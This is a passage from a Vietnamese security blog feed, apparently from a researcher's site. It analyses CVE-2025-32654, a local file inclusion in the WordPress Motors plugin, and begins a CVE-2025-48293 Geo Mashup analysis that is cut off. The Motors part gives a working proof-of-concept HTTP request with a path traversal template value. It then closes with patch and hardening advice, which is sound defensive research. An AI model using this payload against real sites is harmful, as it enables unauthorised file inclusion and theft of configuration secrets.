cyan&#xA;&#xA;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=listing-cars/listing-grid-directory-loop-4&amp;amp;img_size=&amp;amp;security=d15dd83890&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đặt breakpoint trong hàm &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; tại vị trí xử lý dữ liệu trước khi trả về cho client:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ob_start();&#xA;while ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;$listings_query-&amp;gt;the_post();&#xA;&#x9;do_action( &amp;#39;stm_listings_load_template&amp;#39;, $template, $template_args );&#xA;}&#xA;$output .= ob_get_clean();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đoạn mã này chịu trách nhiệm &lt;strong&gt;tạo nội dung HTML động&lt;/strong&gt; từ kết quả truy vấn:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_start()&lt;/code&gt; khởi tạo bộ đệm đầu ra, tạm giữ mọi nội dung được in ra.&lt;/li&gt;&#xA;&lt;li&gt;Vòng &lt;code&gt;while&lt;/code&gt; lặp qua các bài viết trong &lt;code&gt;$listings_query&lt;/code&gt; và gọi &lt;code&gt;do_action( &#39;stm_listings_load_template&#39;, $template, $template_args )&lt;/code&gt; để render từng item theo template tương ứng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_get_clean()&lt;/code&gt; lấy toàn bộ nội dung đã render trong buffer, xóa bộ đệm và gán vào &lt;code&gt;$output&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Kết quả: &lt;code&gt;$output&lt;/code&gt; chứa toàn bộ HTML đã được sinh ra, sẵn sàng gửi về client qua AJAX.&lt;/p&gt;&#xA;&lt;p&gt;Khi gửi lại request và quan sát bằng debugger:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/debug1.png&#34;&#xA;    alt=&#34;Debugger đi qua các logic lấy post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger đi qua các logic lấy post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta thấy rằng với các &lt;strong&gt;tham số mặc định&lt;/strong&gt; do plugin gửi lên, điều kiện &lt;code&gt;$listings_query-&amp;gt;have_posts()&lt;/code&gt; luôn &lt;strong&gt;true&lt;/strong&gt;, nên action hook &lt;code&gt;stm_listings_load_template&lt;/code&gt; được gọi và phần xử lý liên quan đến &lt;code&gt;$template&lt;/code&gt; được thực thi.&lt;/p&gt;&#xA;&lt;p&gt;Hook &lt;code&gt;stm_listings_load_template&lt;/code&gt; được đăng ký với callback cùng tên:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function stm_listings_load_template( $__template, $__vars = array() ) {&#xA;&#x9;extract( $__vars );&#xA;&#x9;include stm_listings_locate_template( $__template );&#xA;}&#xA;add_action( &amp;#39;stm_listings_load_template&amp;#39;, &amp;#39;stm_listings_load_template&amp;#39;, 10, 2 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include&lt;/code&gt; là một trong những sink gây &lt;strong&gt;LFI&lt;/strong&gt; trong WordPress, ta phân tích &lt;code&gt;stm_listings_locate_template()&lt;/code&gt; để xem giá trị thực sự được &lt;code&gt;include&lt;/code&gt; là gì =&amp;gt; giúp tùy chỉnh payload cho phù hợp&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function stm_listings_locate_template( $templates ) {&#xA;&#x9;$located = false;&#xA;&#xA;&#x9;foreach ( (array) $templates as $template ) {&#xA;&#x9;&#x9;if ( substr( $template, - 4 ) !== &amp;#39;.php&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;$template .= &amp;#39;.php&amp;#39;;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( str_contains( $template, &amp;#39;partials/&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;$located = locate_template( $template );&#xA;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;$located = locate_template( &amp;#39;listings/&amp;#39; . $template );&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( ! ( $located ) ) {&#xA;&#x9;&#x9;&#x9;if ( file_exists( realpath( apply_filters( &amp;#39;stm_listings_template_file&amp;#39;, STM_LISTINGS_PATH, $template ) . &amp;#39;/templates/&amp;#39; . $template ) ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$located = realpath( apply_filters( &amp;#39;stm_listings_template_file&amp;#39;, STM_LISTINGS_PATH, $template ) . &amp;#39;/templates/&amp;#39; . $template );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( file_exists( $located ) ) {&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return apply_filters( &amp;#39;stm_listings_locate_template&amp;#39;, $located, $templates );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;stm_listings_locate_template()&lt;/code&gt; nhận tham số &lt;code&gt;$templates&lt;/code&gt;, ép kiểu về mảng rồi &lt;strong&gt;duyệt qua từng phần tử&lt;/strong&gt; để xác định đường dẫn file template hợp lệ cần nạp.&lt;/p&gt;&#xA;&lt;p&gt;Cụ thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu phần tử không có hậu tố &lt;code&gt;.php&lt;/code&gt;, hàm sẽ tự động nối thêm.&lt;/li&gt;&#xA;&lt;li&gt;Nếu đường dẫn chứa chuỗi &lt;code&gt;&#39;partials/&#39;&lt;/code&gt;, nó gọi &lt;code&gt;locate_template( $template )&lt;/code&gt; gán giá trị trả về cho &lt;code&gt;$located&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ngược lại, nó tìm trong thư mục &lt;code&gt;&#39;listings/&#39;&lt;/code&gt; và gán giá trị trả về cho &lt;code&gt;$located&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu vẫn không tìm thấy, hàm thử kiểm tra trực tiếp trong plugin bằng cách ghép:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;STM_LISTINGS_PATH . &amp;#39;/templates/&amp;#39; . $template&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Khi phát hiện file tồn tại (&lt;code&gt;file_exists()&lt;/code&gt;), vòng lặp dừng lại và trả về đường dẫn đó.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/locate_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;locate_template()&lt;/code&gt;&lt;/a&gt; là hàm &lt;strong&gt;core của WordPress&lt;/strong&gt;. Nó tìm file template trong theme hiện tại hoặc child theme. Nếu tìm thấy, nó trả về đường dẫn đầy đủ đến file, còn không thì trả về chuỗi rỗng. =&amp;gt; Ta cần truyền file tồn tại.&lt;/p&gt;&#xA;&lt;p&gt;👉 Kết quả cuối cùng được trả về qua filter &lt;code&gt;stm_listings_locate_template&lt;/code&gt; với đường dẫn là &lt;code&gt;$locate&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/search1.png&#34;&#xA;    alt=&#34;Không có filter stm_listings_locate_template được đăng ký&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Không có filter &lt;code&gt;stm_listings_locate_template&lt;/code&gt; được đăng ký&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Khi tìm với từ khóa &lt;code&gt;stm_listings_locate_template&lt;/code&gt; trong phạm vi plugin, tôi không thấy filter nào được đăng ký =&amp;gt; &lt;code&gt;$locate&lt;/code&gt; sẽ được trả về mà không có thay đổi do filter.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy điều kiện cần để khai thác bao gồm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;template&lt;/code&gt; param chứa &lt;code&gt;partials/&lt;/code&gt; hoặc &lt;code&gt;listings/&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;../&lt;/code&gt; vừa đủ để &lt;code&gt;locate_template()&lt;/code&gt; trong trả về chuỗi rỗng và &lt;code&gt;include&lt;/code&gt; không lỗi nếu đường dẫn không tồn tại&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Thêm code trả về trong &lt;code&gt;wp-config.php&lt;/code&gt; để thử nghiệm&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;echo &amp;#34;payload&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gửi POST request chứa LFI payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#xA;X-Requested-With: XMLHttpRequest&#xA;Content-Length: 123&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Referer: http://localhost/&#xA;Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: cyan&#xA;&#xA;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=/partials/../../../../../payload&amp;amp;img_size=&amp;amp;security=d15dd83890&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-32654 là một &lt;strong&gt;LFI&lt;/strong&gt; trong plugin &lt;strong&gt;Motors ≤1.4.71&lt;/strong&gt;: tham số &lt;code&gt;template&lt;/code&gt; không được ràng buộc, cho phép path traversal và &lt;code&gt;include()&lt;/code&gt; file bất kỳ. Endpoint công khai (&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt;) và nonce xuất trên front‑end giúp kẻ tấn công dễ khai thác. Lỗ hổng được vá trong &lt;strong&gt;v1.4.72&lt;/strong&gt; bằng cách chuẩn hoá tên file và kiểm tra &lt;strong&gt;whitelist&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không dùng input thô để build đường dẫn cho &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ưu tiên &lt;strong&gt;whitelist&lt;/strong&gt; template/đường dẫn hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;Chuẩn hoá (e.g. &lt;code&gt;sanitize_file_name()&lt;/code&gt;/&lt;code&gt;sanitize_key()&lt;/code&gt;), dùng &lt;code&gt;realpath()&lt;/code&gt; để so sánh với thư mục gốc.&lt;/li&gt;&#xA;&lt;li&gt;Nếu endpoint phải công khai, bắt buộc kiểm soát chặt input chứ đừng chỉ trông vào nonce.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/motors-car-dealership-classified-listings/vulnerability/wordpress-motors-plugin-1-4-65-local-file-inclusion-vulnerability-2?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Motors Plugin &amp;lt;= 1.4.71 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48293 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-13-cve-2025-48293/</link>
      <pubDate>Mon, 13 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-13-cve-2025-48293/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-13-cve-2025-48293/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Geo Mashup&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 1.13.16&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48293&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48293&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.13.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.13.17&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/geo-mashup/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Geo Mashup Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Geo Mashup&lt;/strong&gt;: &lt;strong&gt;1.13.16&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.13.17&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function generate_object_html( ) {&#xA;    $template_base = ( isset( $_GET[&amp;#39;template&amp;#39;] ) ) ? $_GET[&amp;#39;template&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    // other logc&#xA;    load_template( GeoMashup::locate_template( $template_base ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$template_base&lt;/code&gt; được lấy trực tiếp từ &lt;code&gt;$_GET[&#39;template&#39;]&lt;/code&gt; 